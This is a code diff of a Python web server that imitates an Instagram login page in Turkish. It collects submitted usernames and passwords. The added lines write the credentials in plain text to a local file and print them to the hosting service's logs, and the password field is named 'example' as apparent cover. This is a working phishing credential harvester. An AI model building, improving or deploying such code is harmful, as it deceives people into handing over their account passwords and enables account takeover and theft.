@@ -1,9 +1,8 @@
-
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import parse_qs
 from pathlib import Path
 from datetime import datetime
-from html import escape
+import os
 
 DOSYA = Path(__file__).with_name("notlar.txt")
 
@@ -53,12 +52,8 @@ small { color: #666; }
   <h2>Hesap Paneli</h2>
   <p>instagram hesabına giriş</p>
   <form method="POST">
-    <input name="kullanici"
-      placeholder=" kullanıcı adı"
-      maxlength="50" required>
-    <input name="ornek"
-      placeholder="Parola"
-      maxlength="50" required>
+    <input name="kullanici" placeholder="Kullanıcı adı" maxlength="50" required>
+    <input name="ornek" type="password" placeholder="Parola" maxlength="50" required>
     <small>İnstagram @ 2026</small>
     <button type="submit">Giriş Yap</button>
   </form>
@@ -89,15 +84,13 @@ class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.cevap(HTML)
 
-   def do_POST(self):
+    def do_POST(self):
         uzunluk = int(self.headers.get("Content-Length", 0))
         if uzunluk > 4096:
             self.send_error(413)
             return
 
-        veri = parse_qs(
-            self.rfile.read(uzunluk).decode("utf-8")
-        )
+        veri = parse_qs(self.rfile.read(uzunluk).decode("utf-8"))
         kullanici = veri.get("kullanici", [""])[0].strip()[:50]
         ornek = veri.get("ornek", [""])[0].strip()[:50]
 
@@ -105,43 +98,27 @@ class Handler(BaseHTTPRequestHandler):
             self.send_error(400)
             return
 
-        # Gelen bilgileri doğrudan loglara yazdırıyoruz
-        print(f"=== YENİ GİRİŞ DENEMESİ ===")
-        print(f"Kullanıcı Adı: {kullanici}")
-        print(f"Parola/Örnek: {ornek}")
-        print(f"Tarih: {datetime.now():%Y-%m-%d %H:%M:%S}")
-        print("=" * 30)
+        # Dosyaya kaydetme
+        try:
+            with DOSYA.open("a", encoding="utf-8") as f:
+                f.write(
+                    f"Tarih: {datetime.now():%Y-%m-%d %H:%M:%S}\n"
+                    f"Kullanıcı: {kullanici}\n"
+                    f"Parola: {ornek}\n"
+                    f"---\n"
+                )
+        except Exception:
+            pass
 
-        self.cevap(SONUC)
-        # Bu satırı ekleyerek gelen bilgilerin Render loglarında görünmesini sağlıyoruz:
-        print(f"---> YENİ GİRİŞ: Kullanıcı={kullanici} | Şifre={ornek}")
-            return
-
-        veri = parse_qs(
-            self.rfile.read(uzunluk).decode("utf-8")
-        )
-        kullanici = veri.get("kullanici", [""])[0].strip()[:50]
-        ornek = veri.get("ornek", [""])[0].strip()[:50]
-
-        if not kullanici or not ornek:
-            self.send_error(400)
-            return
-
-        with DOSYA.open("a", encoding="utf-8") as f:
-            f.write(
-                f"Tarih: {datetime.now():%Y-%m-%d %H:%M:%S}\n"
-                f"Demo kullanıcı: {kullanici}\n"
-                f"Örnek kod: {ornek}\n"
-                f"---\n"
-            )
+        # Render loglarına anlık yazdırma
+        print(f"=== YENİ GİRİŞ ===", flush=True)
+        print(f"Kullanıcı: {kullanici} | Parola: {ornek}", flush=True)
+        print("=" * 30, flush=True)
 
         self.cevap(SONUC)
 
     def log_message(self, format, *args):
         pass
-
-
-import os
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
